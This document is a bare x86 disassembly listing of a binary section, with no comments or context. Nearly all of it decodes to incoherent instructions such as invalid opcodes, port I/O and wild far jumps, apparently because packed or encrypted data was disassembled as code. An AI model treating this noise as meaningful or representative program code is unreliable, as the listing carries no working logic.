  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	xor    eax,0x4ebde324
  401932:	jnp    0x4019b0
  401934:	jl     0x40199d
  401936:	jle    0x4019b4
  401938:	jl     0x4018d8
  40193a:	pop    edx
  40193b:	popa   
  40193c:	inc    eax
  40193d:	xor    al,0x93
  40193f:	retf   0x34e6
  401942:	push   ecx
  401943:	mov    al,0xb0
  401945:	rol    BYTE PTR [esi+0x52],cl
  401948:	mov    eax,0x48774a8e
  40194d:	sub    ecx,DWORD PTR [eax]
  40194f:	fadd   DWORD PTR [ecx+eiz*2+0x75787b83]
  401956:	or     al,0xc3
  401958:	sub    DWORD PTR [edi+0x3443629d],0x60d54923
  401962:	fisub  WORD PTR [edx+0x5a]
  401965:	mov    al,0xe8
  401967:	push   ebp
  401968:	xlat   BYTE PTR ds:[ebx]
  401969:	outs   dx,BYTE PTR ds:[esi]
  40196a:	and    bl,dh
  40196c:	mul    BYTE PTR [ecx-0x73]
  40196f:	mov    DWORD PTR [ecx],esp
  401971:	dec    esi
  401972:	scas   al,BYTE PTR es:[edi]
  401973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401974:	mov    ecx,0x633a69f3
  401979:	test   al,0x28
  40197b:	int3   
  40197c:	sub    BYTE PTR [ecx-0x6cb2cc44],0xb2
  401983:	mov    edx,0xd7271ca1
  401988:	add    ecx,esi
  40198a:	test   DWORD PTR [edi-0x71cab37a],edx
  401990:	dec    ebx
  401991:	pop    esi
  401992:	gs adc esp,0xffffffe7
  401996:	sub    DWORD PTR [edi+0x3d1983bb],esp
  40199c:	retf   
  40199d:	inc    ebp
  40199e:	dec    edi
  40199f:	xor    BYTE PTR ds:0x435f78b6,al
  4019a5:	test   ebp,esi
  4019a7:	iret   
  4019a8:	fisttp QWORD PTR [edi]
  4019aa:	sub    DWORD PTR [ebp-0x319f8217],eax
  4019b0:	sbb    ebp,DWORD PTR [eax]
  4019b2:	cdq    
  4019b3:	mov    eax,0xb66439b5
  4019b8:	lahf   
  4019b9:	jns    0x401a06
  4019bb:	fisttp WORD PTR ds:0xef3dd0c7
  4019c1:	mov    ds:0x67063c5e,eax
  4019c6:	push   esi
  4019c7:	retf   0xa2ff
  4019ca:	sub    eax,DWORD PTR [edi]
  4019cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019cd:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4019cf:	push   0xffffff8c
  4019d1:	lods   al,BYTE PTR ds:[esi]
  4019d2:	aaa    
  4019d3:	push   ecx
  4019d4:	mov    esi,0xc38f69a9
  4019d9:	dec    esi
  4019da:	dec    esi
  4019db:	lahf   
  4019dc:	loopne 0x401a05
  4019de:	neg    ebx
  4019e0:	jb     0x401a0b
  4019e2:	std    
  4019e3:	sub    DWORD PTR [edi],ebp
  4019e5:	xor    DWORD PTR [edx+ebx*1],eax
  4019e8:	or     eax,0xf5bdcf5a
  4019ed:	mov    ds:0x1acb50a7,eax
  4019f2:	mov    al,ds:0x1835a3f0
  4019f7:	pop    ebp
  4019f8:	and    al,0x36
  4019fa:	iret   
  4019fb:	push   edx
  4019fc:	fidivr WORD PTR [esi]
  4019fe:	pop    ds
  4019ff:	or     BYTE PTR [edi],bl
  401a01:	repz and BYTE PTR [esi+0x45],dl
  401a05:	sub    ah,BYTE PTR [edx-0x460ed1dc]
  401a0b:	ds cmp al,0xd2
  401a0e:	lds    edi,FWORD PTR ds:0x156dde70
  401a14:	aaa    
  401a15:	sbb    esi,DWORD PTR [esi+0x3dc9ca41]
  401a1b:	and    edx,DWORD PTR [esi]
  401a1d:	(bad)  
  401a1e:	fimul  WORD PTR [edi+edx*2-0x394af836]
  401a25:	xchg   edx,eax
  401a26:	in     al,dx
  401a27:	repnz cwde 
  401a29:	lea    ebp,[edi-0x32]
  401a2c:	cmp    dl,bl
  401a2e:	into   
  401a2f:	dec    ebx
  401a30:	mov    DWORD PTR gs:[esi+0x5c],0xa81f2727
  401a38:	ins    BYTE PTR es:[edi],dx
  401a39:	inc    ebx
  401a3a:	xor    BYTE PTR [edx-0x406c288c],ch
  401a40:	sub    ebp,DWORD PTR [esi+0x18fa5cdb]
  401a46:	gs sti 
  401a48:	ret    0x1738
  401a4b:	in     eax,dx
  401a4c:	inc    DWORD PTR [ebp+edx*2-0x3fa4b162]
  401a53:	jbe    0x401ad4
  401a55:	shl    DWORD PTR [eax-0x59],cl
  401a58:	adc    al,0xe4
  401a5a:	mov    bh,0x47
  401a5c:	jge    0x401a49
  401a5e:	cli    
  401a5f:	(bad)  
  401a60:	lds    ebx,FWORD PTR [ebx]
  401a62:	test   al,0xf3
  401a64:	daa    
  401a65:	xchg   ebx,eax
  401a66:	jp     0x401abc
  401a68:	cmc    
  401a69:	nop
  401a6a:	sub    ecx,eax
  401a6c:	xchg   BYTE PTR [edx+0x45c6a345],bl
  401a72:	or     cl,dl
  401a74:	cld    
  401a75:	test   al,0xf9
  401a77:	imul   eax,DWORD PTR [ecx],0xafc26468
  401a7d:	or     esi,esp
  401a7f:	xchg   ebx,eax
  401a80:	out    0x20,al
  401a82:	fiadd  DWORD PTR es:[eax-0x53]
  401a86:	dec    ebp
  401a87:	leave  
  401a88:	jne    0x401a30
  401a8a:	dec    edi
  401a8b:	adc    bh,BYTE PTR ds:0xd567407d
  401a91:	lea    ebp,[ecx+0x7f]
  401a94:	xor    eax,0x83060643
  401a99:	xchg   ebp,eax
  401a9a:	loopne 0x401a24
  401a9c:	pop    ss
  401a9d:	add    cl,BYTE PTR [ecx-0x15b1774a]
  401aa3:	dec    eax
  401aa4:	push   esi
  401aa5:	lea    ebp,gs:[eax+0x2a]
  401aa9:	inc    edx
  401aaa:	stos   DWORD PTR es:[edi],eax
  401aab:	ret    
  401aac:	(bad)  
  401aad:	jmp    0x401a70
  401aaf:	adc    al,BYTE PTR [esi+0x7c]
  401ab2:	fwait
  401ab3:	mov    DWORD PTR [edx+0xcdba1cf],eax
  401ab9:	fbstp  TBYTE PTR [edx-0x1]
  401abc:	fnstsw WORD PTR [edx]
  401abe:	loop   0x401add
  401ac0:	push   cs
  401ac1:	fs in  eax,dx
  401ac3:	ja     0x401b06
  401ac5:	popf   
  401ac6:	enter  0xff12,0x1d
  401aca:	stos   DWORD PTR es:[edi],eax
  401acb:	das    
  401acc:	sar    dl,0x46
  401acf:	xchg   ecx,eax
  401ad0:	sbb    cl,dh
  401ad2:	xchg   edx,eax
  401ad3:	cld    
  401ad4:	in     eax,0x9d
  401ad6:	mov    edx,0x1013533a
  401adb:	cdq    
  401adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401add:	daa    
  401ade:	push   ecx
  401adf:	inc    edi
  401ae0:	imul   ebp,eax,0x6741a822
  401ae6:	push   eax
  401ae7:	add    al,0xec
  401ae9:	imul   ebx,ebx,0xffffffe1
  401aec:	pop    ebx
  401aed:	xchg   edi,eax
  401aee:	push   0xffffffb1
  401af0:	lds    esp,FWORD PTR [esi+edi*4+0x26]
  401af4:	sbb    BYTE PTR [edi],bl
  401af6:	out    0xd6,eax
  401af8:	test   BYTE PTR [eax],cl
  401afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401afb:	lea    ebp,[eax-0x46]
  401afe:	mov    bl,0x0
  401b00:	ds ss int3 
  401b03:	xchg   esp,eax
  401b04:	(bad)  
  401b05:	(bad)  [edx]
  401b07:	mov    ebx,DWORD PTR [ebp-0x444d421f]
  401b0d:	outs   dx,BYTE PTR ds:[esi]
  401b0e:	jmp    eax
  401b10:	in     eax,0xf8
  401b12:	test   DWORD PTR [esi],0x8015d936
  401b18:	and    esi,DWORD PTR [edx-0x10]
  401b1b:	xor    ecx,eax
  401b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b1e:	or     ebp,DWORD PTR [ebp+ebx*4-0x35a78ce8]
  401b25:	and    BYTE PTR [edi+0x4e6b519c],ch
  401b2b:	sub    al,0xdf
  401b2d:	imul   ebx,ebx,0x57
  401b30:	test   al,dh
  401b32:	dec    edi
  401b33:	in     eax,dx
  401b34:	inc    edx
  401b35:	or     edx,ebx
  401b37:	dec    esp
  401b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b39:	dec    esp
  401b3a:	inc    edi
  401b3b:	cmp    eax,0x6f8a728
  401b40:	les    edi,FWORD PTR [ecx+eiz*8-0x7cd26ec3]
  401b47:	jno    0x401b78
  401b49:	cmp    dh,al
  401b4b:	xchg   esi,eax
  401b4c:	js     0xe8b4f4cf
  401b52:	dec    edi
  401b53:	lods   eax,DWORD PTR ds:[esi]
  401b54:	imul   esp,DWORD PTR [ebx],0x6e
  401b57:	leave  
  401b58:	sahf   
  401b59:	es jmp 0x401bbe
  401b5c:	mov    esp,0xe6c87ef5
  401b61:	lods   eax,DWORD PTR ds:[esi]
  401b62:	inc    ecx
  401b63:	xor    DWORD PTR [edi-0x66371e4b],esi
  401b69:	cmp    ebx,DWORD PTR [edi]
  401b6b:	cmp    DWORD PTR [edi*1-0x6b97d32],esp
  401b72:	je     0x401b8b
  401b74:	fldenv [eax]
  401b76:	adc    DWORD PTR [esi-0x70a21867],ecx
  401b7c:	imul   DWORD PTR [edi]
  401b7e:	addr16 jb 0x401b5c
  401b81:	add    al,0xda
  401b83:	outs   dx,DWORD PTR ds:[esi]
  401b84:	mov    ch,0xd2
  401b86:	jp     0x401b62
  401b88:	outs   dx,BYTE PTR ds:[esi]
  401b89:	nop
  401b8a:	not    BYTE PTR [ebp-0xe62306e]
  401b90:	bound  edx,QWORD PTR [eax-0xaf323e3]
  401b96:	pop    ds
  401b97:	clc    
  401b98:	xchg   esp,eax
  401b99:	mov    dh,0x7d
  401b9b:	ret    
  401b9c:	push   ds
  401b9d:	mov    ds:0x85d91a9c,eax
  401ba2:	rcl    ah,cl
  401ba4:	les    eax,FWORD PTR [ecx-0x51b69f5a]
  401baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bab:	repz out dx,al
  401bad:	(bad)  
  401bae:	jge    0x401bbf
  401bb0:	pop    ebp
  401bb1:	jne    0x401b70
  401bb3:	ret    
  401bb4:	add    eax,0xb2721843
  401bba:	neg    bh
  401bbc:	lahf   
  401bbd:	test   edx,0x1703498f
  401bc3:	or     ebp,esp
  401bc5:	mov    WORD PTR [eax+edx*4+0x3d],cs
  401bc9:	leave  
  401bca:	arpl   WORD PTR [ebx-0x54c196d2],bp
  401bd0:	adc    eax,0xdcc97a8e
  401bd5:	sub    esp,DWORD PTR [esi+0x63]
  401bd8:	add    BYTE PTR [ecx*1-0x6980cd8d],ah
  401bdf:	sub    al,0xd8
  401be1:	rcr    BYTE PTR [eax-0xc],cl
  401be4:	ret    0x524f
  401be7:	mov    esi,0x92c1a8fe
  401bec:	fldenv [ebx+ebp*2]
  401bef:	cmp    BYTE PTR [esi-0x1a],ch
  401bf2:	jae    0x401bcc
  401bf4:	js     0x401c2c
  401bf6:	outs   dx,DWORD PTR ds:[esi]
  401bf7:	and    al,bh
  401bf9:	mov    eax,ds:0xca93d3c
  401bfe:	xchg   edx,eax
  401bff:	fild   QWORD PTR [edx-0x23]
  401c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c03:	cmp    eax,0xe67e05e0
  401c08:	jnp    0x401bc9
  401c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c0b:	mov    ch,0xf0
  401c0d:	sub    DWORD PTR [edx],edx
  401c0f:	cmp    esi,ecx
  401c11:	cld    
  401c12:	(bad)
  401c15:	inc    edi
  401c16:	jmp    0x26098dd8
  401c1b:	mov    edx,0x389d3db1
  401c20:	xor    BYTE PTR ss:[ebx],0xce
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0xd126e2ab
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c0d
  401c4b:	lahf   
  401c4c:	ds sbb dh,cl
  401c4f:	add    bh,BYTE PTR [edx+edx*8]
  401c52:	pop    es
  401c53:	int3   
  401c54:	xor    al,0x4a
  401c56:	addr16 leave 
  401c58:	xlat   BYTE PTR ds:[ebx]
  401c59:	stos   BYTE PTR es:[edi],al
  401c5a:	dec    ebp
  401c5b:	je     0x401c9e
  401c5d:	out    dx,eax
  401c5e:	lock repnz repnz retf 0xff7a
  401c64:	inc    edi
  401c65:	sbb    bl,BYTE PTR [edx+0x445d9f08]
  401c6b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c6d:	inc    esi
  401c6e:	outs   dx,DWORD PTR ds:[esi]
  401c6f:	stos   BYTE PTR es:[edi],al
  401c70:	sub    al,0x68
  401c72:	nop
  401c73:	xchg   DWORD PTR [ebp-0x49],ecx
  401c76:	mov    edi,0xa39486aa
  401c7b:	dec    edx
  401c7c:	aas    
  401c7d:	pop    ss
  401c7e:	add    DWORD PTR [esi-0x66c9853b],ebx
  401c84:	das    
  401c85:	dec    ebx
  401c86:	and    DWORD PTR [ebp+0x4664bfb3],esi
  401c8c:	push   es
  401c8d:	test   DWORD PTR [ebx+0x6f],0x86169090
  401c94:	adc    ecx,DWORD PTR [ebp+0x4e]
  401c97:	add    esi,DWORD PTR ds:0xdcdbfa76
  401c9d:	xchg   BYTE PTR [esi-0x8127f2],bl
  401ca3:	inc    edi
  401ca4:	sub    cl,BYTE PTR [edx-0x67]
  401ca7:	lea    edi,[eax+0x5dc0f3a5]
  401cad:	das    
  401cae:	inc    edi
  401caf:	iret   
  401cb0:	fucomi st,st(2)
  401cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cb3:	cmp    al,0x5f
  401cb5:	inc    ebp
  401cb6:	adc    DWORD PTR [ebp+ebp*2-0x43e036],esp
  401cbd:	lds    esp,FWORD PTR [ecx+0x4b06e93a]
  401cc3:	pop    edx
  401cc4:	add    eax,0x969e7763
  401cc9:	je     0x401c4f
  401ccb:	pop    ebx
  401ccc:	leave  
  401ccd:	in     al,dx
  401cce:	xor    bl,dl
  401cd0:	xor    cl,dh
  401cd2:	mov    edi,0x2a84ce9
  401cd7:	retf   
  401cd8:	fcmove st,st(1)
  401cda:	mov    bh,cl
  401cdc:	clc    
  401cdd:	mov    ebx,0xa9d9c57b
  401ce2:	loope  0x401d55
  401ce4:	add    ch,BYTE PTR [edi-0x6be32fb6]
  401cea:	shr    edi,1
  401cec:	or     eax,0x8593448a
  401cf1:	mov    al,ds:0x9e5fa0b1
  401cf6:	add    BYTE PTR [esi+eiz*2-0xdd81c08],al
  401cfd:	and    al,0xaf
  401cff:	dec    edx
  401d00:	or     al,0x73
  401d02:	stos   BYTE PTR es:[edi],al
  401d03:	add    eax,0x704a1cf5
  401d08:	cmp    DWORD PTR [edi+0xe],esp
  401d0b:	out    0xa,al
  401d0d:	test   eax,0x49ebb174
  401d12:	xchg   DWORD PTR [edi+ecx*4-0x7400461c],esi
  401d19:	stc    
  401d1a:	and    ecx,DWORD PTR [ebp-0x48d9afe3]
  401d20:	pop    ebp
  401d21:	sahf   
  401d22:	push   es
  401d23:	scas   eax,DWORD PTR es:[edi]
  401d24:	push   ebp
  401d25:	sbb    al,0x89
  401d27:	aaa    
  401d28:	cmp    bl,dh
  401d2a:	pop    edx
  401d2b:	(bad)  
  401d2c:	jbe    0x401d8e
  401d2e:	push   eax
  401d2f:	xchg   esp,eax
  401d30:	pop    eax
  401d31:	lds    eax,FWORD PTR [esi]
  401d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d34:	fild   QWORD PTR [eax+0x7]
  401d37:	mov    eax,ds:0xb573b8e8
  401d3c:	frstor [eax-0x8fd1d44]
  401d42:	pop    ecx
  401d44:	jno    0x401dc5
  401d46:	sub    eax,0xf5b915e8
  401d4b:	ret    
  401d4c:	ret    
  401d4d:	int    0x8c
  401d4f:	sub    al,0x4a
  401d51:	inc    edx
  401d52:	int    0x64
  401d54:	xchg   esp,eax
  401d55:	xor    dl,bh
  401d57:	mov    bl,0xb6
  401d59:	cmp    ebx,DWORD PTR [ebx+0x1aeb26b3]
  401d5f:	ja     0x401dcc
  401d61:	mov    dl,bl
  401d63:	mov    cl,BYTE PTR [edx*4+0x22d626be]
  401d6a:	in     al,dx
  401d6b:	mov    bh,0x4c
  401d6d:	or     al,dl
  401d6f:	into   
  401d70:	jmp    0x9a3a2d2
  401d75:	lods   eax,DWORD PTR ds:[esi]
  401d76:	mov    esi,0x4e395c07
  401d7b:	push   ss
  401d7c:	pop    ecx
  401d7d:	imul   edi,DWORD PTR [edx],0xfffffff8
  401d80:	xlat   BYTE PTR ds:[ebx]
  401d81:	and    ah,BYTE PTR [esi]
  401d83:	push   ss
  401d84:	retf   
  401d85:	inc    eax
  401d86:	inc    ebp
  401d87:	iret   
  401d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d89:	or     DWORD PTR [edi-0x6cccefa8],edi
  401d8f:	je     0x401d19
  401d91:	inc    esi
  401d92:	fbld   TBYTE PTR [ecx+eax*4-0x14]
  401d97:	mov    esi,DWORD PTR [ebx]
  401d99:	ds mov dh,0xbf
  401d9c:	les    ecx,FWORD PTR [esp+ebx*2+0x297e7e0f]
  401da3:	pop    eax
  401da4:	jp     0x401df3
  401da6:	scas   al,BYTE PTR es:[edi]
  401da7:	dec    esp
  401da8:	cmp    ecx,ecx
  401daa:	test   DWORD PTR [edx+0x14e83bdc],0x1a3043c7
  401db4:	shl    BYTE PTR [edi],cl
  401db6:	push   ebx
  401db7:	loope  0x401d74
  401db9:	nop
  401dba:	mov    dl,0x23
  401dbc:	(bad)  
  401dbd:	jae    0x401d52
  401dbf:	shr    DWORD PTR [edi-0x24d3c4d9],1
  401dc5:	cmp    esi,DWORD PTR [ebx-0x2]
  401dc8:	mov    edx,0xd22b74d7
  401dcd:	sub    al,0x90
  401dcf:	(bad)  
  401dd0:	fisubr WORD PTR [edi+0xb24bfbe]
  401dd6:	daa    
  401dd7:	xor    eax,0x111dc2fc
  401ddc:	dec    ebp
  401ddd:	out    dx,eax
  401dde:	vpshab ymm5,xmm7,[eax-0x1ab1bda7]
  401de7:	leave  
  401de8:	add    al,0x5f
  401dea:	add    eax,ebp
  401dec:	std    
  401ded:	loope  0x401d79
  401def:	mov    al,ds:0xdcf849be
  401df4:	pop    esp
  401df5:	fcom   st(2)
  401df7:	add    BYTE PTR [esi-0x40],al
  401dfa:	rol    ecx,1
  401dfc:	ret    0x73aa
  401dff:	call   0xb4f6:0x7fc9291d
  401e06:	xchg   edi,eax
  401e07:	sbb    al,0x25
  401e09:	call   0xb48b:0x37cf625a
  401e10:	push   esi
  401e11:	and    BYTE PTR [ecx],ah
  401e13:	xor    cl,BYTE PTR [edi]
  401e15:	std    
  401e16:	xor    ebx,DWORD PTR [ebx-0x352b869d]
  401e1c:	rol    BYTE PTR [ecx],0x4e
  401e1f:	rcl    DWORD PTR [edx+eiz*2],cl
  401e22:	addr16 jl 0x401daa
  401e25:	jle    0x401e8b
  401e27:	out    dx,eax
  401e28:	push   ss
  401e29:	shl    DWORD PTR [ecx+0x73],0xf2
  401e2d:	xchg   DWORD PTR [ebx-0x27],ecx
  401e30:	mov    edx,0x3babf2f8
  401e35:	jmp    0x401e6d
  401e37:	retf   0x530c
  401e3a:	clc    
  401e3b:	jg     0x401dd7
  401e3d:	(bad)  
  401e3f:	cli    
  401e40:	rol    bl,1
  401e42:	sbb    bl,BYTE PTR [eax+ebp*4+0x3c]
  401e46:	and    DWORD PTR [esi],esi
  401e48:	lods   eax,DWORD PTR ds:[esi]
  401e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e4a:	mov    ds:0x400c8cca,al
  401e4f:	stc    
  401e50:	add    edi,edi
  401e52:	jo     0x401e17
  401e54:	pop    ebp
  401e55:	test   al,0x6f
  401e57:	pop    ss
  401e58:	js     0x401e65
  401e5a:	push   edi
  401e5b:	shr    BYTE PTR [eax-0x6d12fc15],0xc6
  401e62:	test   al,0x71
  401e64:	mov    esp,0xe9ddb9cd
  401e69:	and    BYTE PTR [edi-0xe],bh
  401e6c:	sub    ch,BYTE PTR [ecx-0x79]
  401e6f:	ds mov esp,0x9f9e1a60
  401e75:	faddp  st(1),st
  401e77:	jge    0x401eb8
  401e79:	pop    ds
  401e7a:	ins    BYTE PTR es:[edi],dx
  401e7b:	push   0xf98d9bd3
  401e80:	push   cs
  401e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e82:	adc    DWORD PTR [edx+0x2a],edx
  401e85:	fiadd  DWORD PTR [edi]
  401e87:	mov    ecx,0x6eab4e49
  401e8c:	out    dx,al
  401e8d:	pusha  
  401e8e:	ret    0xa2ee
  401e91:	jo     0x401e7a
  401e93:	xchg   esi,eax
  401e94:	arpl   bp,di
  401e96:	ins    BYTE PTR es:[edi],dx
  401e97:	in     eax,0xab
  401e99:	neg    DWORD PTR [eax-0x31fdce12]
  401e9f:	jge    0x401e68
  401ea1:	fmul   QWORD PTR [ebx]
  401ea3:	cmp    al,0x2b
  401ea5:	mov    WORD PTR [esi+esi*4-0x2c6caecf],cs
  401eac:	adc    edi,DWORD PTR [ebx]
  401eae:	sub    DWORD PTR [ecx-0x9667638],esi
  401eb4:	ins    DWORD PTR es:[edi],dx
  401eb5:	fwait
  401eb6:	dec    ebp
  401eb7:	xor    eax,0xa23ed0d4
  401ebc:	and    al,0x3b
  401ebe:	repz or eax,0xc6758ed2
  401ec4:	xchg   ebp,eax
  401ec5:	dec    edx
  401ec6:	sub    al,BYTE PTR [eax]
  401ec8:	xor    eax,DWORD PTR [bp+di-0x73]
  401ecc:	loop   0x401e92
  401ece:	xor    BYTE PTR [edx-0x480b76c5],dh
  401ed4:	adc    ebx,DWORD PTR [esp+ecx*4]
  401ed7:	sub    edx,ebp
  401ed9:	sub    cl,BYTE PTR [esi+ebx*8+0x12c56f55]
  401ee0:	out    dx,eax
  401ee1:	aam    0x7b
  401ee3:	sbb    dh,bl
  401ee5:	lds    ebp,FWORD PTR [eax]
  401ee7:	cmp    al,0xeb
  401ee9:	sti    
  401eea:	xchg   ebp,eax
  401eeb:	cs dec esi
  401eed:	test   eax,0x21774b7b
  401ef2:	dec    edi
  401ef3:	in     eax,dx
  401ef4:	(bad)  
  401ef5:	dec    DWORD PTR [edx+0x6c]
  401ef8:	jle    0x401f05
  401efa:	or     dl,dl
  401efc:	or     DWORD PTR [eax],eax
  401efe:	bound  esi,QWORD PTR [edi+0x207b5f6]
  401f04:	ror    DWORD PTR [ebx+0x22],1
  401f07:	inc    edi
  401f08:	push   edi
  401f09:	pop    ss
  401f0a:	add    al,0xbc
  401f0c:	mov    edx,ebx
  401f0e:	imul   edx,DWORD PTR [ebp+edi*8-0x1f],0xffffffaf
  401f13:	mov    bl,0x43
  401f15:	add    dl,BYTE PTR [edi+eiz*1]
  401f18:	lods   eax,DWORD PTR ss:[esi]
  401f1a:	dec    ebp
  401f1b:	inc    esi
  401f1c:	sbb    al,0x64
  401f1e:	mov    al,ds:0xf1c7381
  401f23:	xor    ecx,DWORD PTR [ecx+0x71a4e977]
  401f29:	call   0x36aa:0x680a2abf
  401f30:	test   BYTE PTR [ecx+ecx*8-0x5f],ah
  401f34:	jmp    0x6600:0x8b00413b
  401f3b:	mov    ecx,DWORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xb26cd150
  401f5d:	fs cwde 
  401f5f:	add    DWORD PTR [esp+edi*2+0x67],edi
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f34
  401f67:	add    ah,dl
  401f69:	cmc    
  401f6a:	pop    ds
  401f6b:	and    bl,al
  401f6d:	mov    DWORD PTR [edx],ebp
  401f6f:	hlt    
  401f70:	push   esp
  401f71:	dec    esi
  401f72:	push   esp
  401f73:	mov    WORD PTR [edx],?
  401f75:	(bad)  
  401f76:	mov    esi,0x11c65a9a
  401f7b:	iret   
  401f7c:	pop    ebx
  401f7d:	push   edi
  401f7e:	(bad)  
  401f7f:	(bad)  
  401f80:	nop
  401f81:	aad    0xd4
  401f83:	frstor [edi+0x57]
  401f86:	add    BYTE PTR [esi+0x6473ca7b],al
  401f8c:	or     al,0x77
  401f8e:	aas    
  401f8f:	jae    0x401fa5
  401f91:	dec    edi
  401f92:	pop    esp
  401f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f94:	inc    ebx
  401f95:	add    eax,0x84ad9fb2
  401f9a:	mov    ds:0x428c4b5d,al
  401f9f:	sub    eax,0xa4c5352
  401fa4:	cmp    esi,DWORD PTR [ecx]
  401fa6:	div    cl
  401fa8:	mov    esp,eax
  401faa:	sbb    esp,edi
  401fac:	inc    esi
  401fad:	in     eax,dx
  401fae:	jno    0x401f71
  401fb0:	aam    0xbb
  401fb2:	sub    al,0xd
  401fb4:	loop   0x401f8a
  401fb6:	(bad)  
  401fb7:	scas   al,BYTE PTR es:[edi]
  401fb8:	sbb    BYTE PTR [ecx-0x36],ch
  401fbb:	lea    ecx,[edx+0x28]
  401fbe:	xor    BYTE PTR [esi+0x61480a31],0x77
  401fc5:	inc    edx
  401fc6:	(bad)
  401fca:	jne    0x401f8f
  401fcc:	aaa    
  401fcd:	mov    dh,0x8a
  401fcf:	jp     0x402034
  401fd1:	mov    dh,0xd5
  401fd3:	and    dl,BYTE PTR [ebx]
  401fd5:	adc    edi,esp
  401fd7:	xchg   esi,eax
  401fd8:	pop    edi
  401fd9:	loope  0x401f5e
  401fdb:	and    ecx,ebx
  401fdd:	jno    0x401f6b
  401fdf:	es sti 
  401fe1:	in     eax,0xf7
  401fe3:	xor    ebx,DWORD PTR [ecx*1+0x710eebc]
  401fea:	xchg   edi,eax
  401feb:	pop    edi
  401fec:	cdq    
  401fed:	idiv   esp
  401fef:	es pop esi
  401ff1:	rol    DWORD PTR [ebx],cl
  401ff3:	mov    WORD PTR [ebx+0x72],?
  401ff6:	idiv   DWORD PTR [ecx+0x4597c652]
  401ffc:	jnp    0x40202a
  401ffe:	sahf   
  401fff:	loop   0x401fba
  402001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402002:	jge    0x401f96
  402004:	cmp    bl,BYTE PTR [edi-0x66]
  402007:	inc    BYTE PTR [ebx-0x5601a3ea]
  40200d:	pop    ebx
  40200e:	sub    eax,0x40571982
  402013:	(bad)  
  402014:	shl    ebp,cl
  402016:	mov    ds:0x548a797c,al
  40201b:	push   esp
  40201c:	test   BYTE PTR [edi+0x6],0xa4
  402020:	imul   ebx,eax,0xffffffc1
  402023:	sbb    al,BYTE PTR [ecx]
  402025:	mov    DWORD PTR [ebp-0x48],esp
  402028:	inc    esi
  402029:	call   0x771e733e
  40202e:	cld    
  40202f:	cmc    
  402030:	(bad)  
  402031:	in     eax,0x53
  402033:	fucomi st,st(1)
  402035:	fild   DWORD PTR [ebp-0x74]
  402038:	or     BYTE PTR ds:0xdbe0f1b4,dh
  40203e:	aam    0x20
  402040:	in     eax,dx
  402041:	repnz add BYTE PTR es:[ecx-0x68],bh
  402046:	pop    eax
  402047:	or     eax,0x788ce510
  40204c:	cmp    DWORD PTR [ecx],ebp
  40204e:	outs   dx,DWORD PTR ds:[esi]
  40204f:	call   0x75f1d83a
  402054:	jmp    0xe51abca7
  402059:	mov    BYTE PTR [edi+0x6],dl
  40205c:	addr16 inc ecx
  40205e:	xchg   esp,eax
  40205f:	test   BYTE PTR [esp+edx*1+0x70],ch
  402063:	xor    bh,bh
  402065:	sub    BYTE PTR [esi+0x24b6e684],cl
  40206b:	dec    ebp
  40206c:	mov    dh,0xce
  40206e:	call   0xe609:0x6db428d0
  402075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402076:	seto   BYTE PTR [eax]
  402079:	mov    ebx,0x905eab35
  40207e:	and    DWORD PTR [edi+0x78cc5a37],edi
  402084:	fcomp  DWORD PTR [esi-0x7d]
  402087:	retf   
  402088:	xor    cl,0x3c
  40208b:	mov    ecx,0x9a89fdbd
  402090:	dec    ebx
  402091:	test   BYTE PTR [ebx],al
  402093:	add    BYTE PTR ds:0xa1872f46,ah
  402099:	and    DWORD PTR [ebx-0x7085f094],ecx
  40209f:	fistp  DWORD PTR [esi]
  4020a1:	xchg   ecx,eax
  4020a2:	sbb    DWORD PTR [ebx+0x4a],0x67
  4020a6:	mov    al,ds:0xaac0a56b
  4020ab:	sub    al,0x33
  4020ad:	scas   eax,DWORD PTR es:[edi]
  4020ae:	or     ebx,DWORD PTR [eax-0x558d1400]
  4020b4:	scas   eax,DWORD PTR es:[edi]
  4020b5:	or     eax,DWORD PTR [eax+0x19c77800]
  4020bb:	mov    dh,0xe0
  4020bd:	nop
  4020be:	je     0x402136
  4020c0:	mov    ebx,0xa7590894
  4020c5:	xor    esp,edi
  4020c7:	inc    ecx
  4020c8:	cmp    bl,BYTE PTR [ecx+0x2f]
  4020cb:	adc    al,0x90
